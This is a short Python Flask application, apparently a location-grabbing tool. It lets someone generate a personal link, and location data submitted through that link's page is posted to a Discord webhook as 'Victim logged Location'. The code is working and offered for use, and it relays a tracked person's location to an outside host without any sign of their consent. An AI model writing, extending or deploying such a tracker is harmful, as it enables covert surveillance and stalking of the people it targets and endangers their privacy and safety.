from flask import Flask, render_template, request, redirect, url_for
import requests

app = Flask(__name__)

# A dictionary to store generated URLs and their corresponding Discord webhook URLs
generated_urls = {}

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form.get('name')
        webhook_url = request.form.get('webhook_url')
        if name in generated_urls:
            return "Name already used. Please choose another name."
        else:
            generated_urls[name] = webhook_url
            # Send the first message to Discord
            data = {
                "content": f"Site generated URL: http://example.com/{name}"
            }
            requests.post(webhook_url, json=data)
            return redirect(url_for('generate_url', name=name))
    return render_template('index.html')

@app.route('/<name>', methods=['GET', 'POST'])
def generate_url(name):
    if request.method == 'POST':
        location = request.form.get('location')
        webhook_url = generated_urls.get(name)
        if webhook_url:
            # Send the second message to Discord
            data = {
                "content": f"Victim logged Location: {location}"
            }
            requests.post(webhook_url, json=data)
        return "Location sent to Discord webhook."
    return render_template('da.html', name=name)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
